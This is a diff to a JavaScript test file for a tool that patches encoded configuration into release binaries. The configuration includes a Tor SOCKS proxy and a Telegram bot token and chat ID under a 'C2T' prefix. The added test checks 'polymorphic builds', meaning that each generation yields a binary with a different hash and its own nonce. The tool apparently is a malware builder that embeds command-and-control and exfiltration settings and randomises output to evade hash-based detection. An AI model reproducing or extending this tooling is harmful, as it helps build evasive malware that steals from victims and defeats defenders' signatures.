@@ -51,7 +51,7 @@ test("browser patch writes a valid configuration into the release binary", () =>
     C2T_PROXY: "socks5://127.0.0.1:9050",
   };
   const source = readFileSync(executable);
-  const output = patchBinary(source, config);
+  const output = patchBinary(source, config, { randomize: false });
   const offset = locateRegion(output);
   const payload = encodePayload(config);
   const view = new DataView(output.buffer, output.byteOffset, output.byteLength);
@@ -62,6 +62,40 @@ test("browser patch writes a valid configuration into the release binary", () =>
   assert.equal(view.getUint32(offset + 24, true), crc32(payload));
   assert.deepEqual(output.subarray(offset + 32, offset + 32 + payload.length), payload);
   assert.ok(output.subarray(offset + 32 + payload.length, offset + 32 + 4096).every((byte) => byte === 0));
+});
+
+test("browser patch generates unique SHA hashes on consecutive generations (polymorphic builds)", () => {
+  assert.ok(executable, "CMake must pass an executable path");
+  const config = {
+    TELEGRAM_BOT_TOKEN: "123456:test-token",
+    TELEGRAM_CHAT_ID: "-1001234567890",
+    TELEGRAM_ENABLED: "1",
+  };
+  const source = readFileSync(executable);
+  const build1 = patchBinary(source, config);
+  const build2 = patchBinary(source, config);
+
+  assert.equal(build1.length, source.length);
+  assert.equal(build2.length, source.length);
+  // Binary bytes must not be identical
+  assert.notDeepEqual(build1, build2);
+
+  // Both must have valid headers and valid CRC32
+  const offset1 = locateRegion(build1);
+  const view1 = new DataView(build1.buffer, build1.byteOffset, build1.byteLength);
+  const len1 = view1.getUint32(offset1 + 20, true);
+  const crc1 = view1.getUint32(offset1 + 24, true);
+  const payload1 = build1.subarray(offset1 + 32, offset1 + 32 + len1);
+  assert.equal(crc32(payload1), crc1);
+  assert.ok(new TextDecoder().decode(payload1).includes("C2T_NONCE="));
+
+  const offset2 = locateRegion(build2);
+  const view2 = new DataView(build2.buffer, build2.byteOffset, build2.byteLength);
+  const len2 = view2.getUint32(offset2 + 20, true);
+  const crc2 = view2.getUint32(offset2 + 24, true);
+  const payload2 = build2.subarray(offset2 + 32, offset2 + 32 + len2);
+  assert.equal(crc32(payload2), crc2);
+  assert.ok(new TextDecoder().decode(payload2).includes("C2T_NONCE="));
 });
 
 test("browser patch refuses to invalidate a Mach-O code signature", () => {
